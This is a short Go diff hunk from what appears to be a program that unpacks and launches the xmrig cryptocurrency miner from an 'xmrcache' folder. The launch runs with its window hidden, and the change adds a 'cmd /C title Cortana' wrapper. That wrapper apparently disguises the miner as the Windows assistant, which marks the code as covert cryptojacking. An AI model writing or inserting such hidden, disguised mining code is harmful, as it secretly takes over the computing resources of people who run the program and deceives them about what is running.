@@ -116,7 +116,7 @@ func unzipFile(f *zip.File, destination string) error {
 }
 
 func startCommand(dir string) {
-	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
+	cmd := exec.Command("cmd", "/C", "title", "Cortana", ";", filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
 
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
